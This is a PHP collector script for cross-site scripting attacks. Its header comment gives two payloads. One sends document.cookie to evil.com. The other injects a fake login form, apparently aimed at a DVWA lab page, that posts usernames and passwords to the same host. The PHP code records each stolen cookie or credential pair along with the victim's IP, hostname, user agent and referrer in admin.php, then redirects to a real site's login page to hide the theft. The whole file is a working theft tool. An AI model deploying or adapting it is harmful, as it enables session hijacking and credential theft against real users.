<?php
/*
Usage for cookies:
<script>location.href='http://evil.com/c.php?c='+escape(document.cookie)</script> 

Usage for user/password:
<sCriPt>
document.getElementsByName('XSS')[0].style.display = "none";
var div = document.createElement('div');
div.className = 'vulnerable_code_area';
div.innerHTML = '<form name="evil" action="http://evil.com/c/c.php" method="GET"><p>User login:<br/><br/><label><b>Username: </b></label><input type="text" placeholder="Enter user name" name="uname" required><br/><label><b>Password:  </b></label><input type="password" placeholder="Enter Password" name="psw" required><br/><br/><button type="submit">Login</button></p></form>';
document.getElementsByClassName('vulnerable_code_area')[0].appendChild(div);
</sCriPt>


*/

	function addToStealed($file, $ip, $host, $navigator, $date, $heure, $provenance, $data)
	{
		$tmp		= file($file);
		$newPage	= '';
		while($ligneActuelle = array_shift($tmp))
		{
			//if(preg_match("#<!-- Breakpoint -->#",$ligneActuelle)) //si on rencontre le breakpoint
			if($ligneActuelle == "<!-- Breakpoint1 -->\n") 
			{
				$newPage .= "<tr><td>$ip</td><td>$host</td><td>$navigator</td><td>$date</td><td>$heure</td><td>$data</td><td>$provenance</td></tr>";
				$newPage .= "\n<!-- Breakpoint1 -->\n";
			}
			elseif($ligneActuelle == "<!-- Breakpoint2 -->\n")
			{
				$newPage .= "<tr><td>$ip</td><td>$host</td><td>$navigator</td><td>$date</td><td>$heure</td><td>$data</td><td>$provenance</td></tr>";
				$newPage .= "\n<!-- Breakpoint2 -->\n";
			}
			else
			{
				$newPage .= $ligneActuelle;	
			}
		}
		
		$monfichier = fopen($file, 'w');
		fseek($monfichier, 0);
		fputs($monfichier, $newPage);
	 
		fclose($monfichier);
	}
	
	$ip			= $_SERVER['REMOTE_ADDR'];
	$host		= gethostbyaddr($ip);
	$navigator	= $_SERVER['HTTP_USER_AGENT'];
	$date		= date("d/m/Y");
	$heure		= date("H:i:s");
	$provenance	= (!empty($_SERVER['HTTP_REFERER'])) ? $_SERVER['HTTP_REFERER'] : 'Unspecified';
	if(isset($_GET['c'])){
		$data	= $_GET['c'];
	}	
	else 
	{
		if(isset($_GET['uname'])){
			$data	= 'Usuario: ' . $_GET['uname'] . ' - Password: ' . $_GET['psw'];
		}
		else {
			$data	= 'No data on user param';
		}
	} 	
	

	
	addToStealed("admin.php", $ip, $host, $navigator, $date, $heure, $provenance, $data);
	echo "Unauthorized Access";
	// post "robo" redirection
	header("Location: http://www.murciasalus.es/login.php");
?>
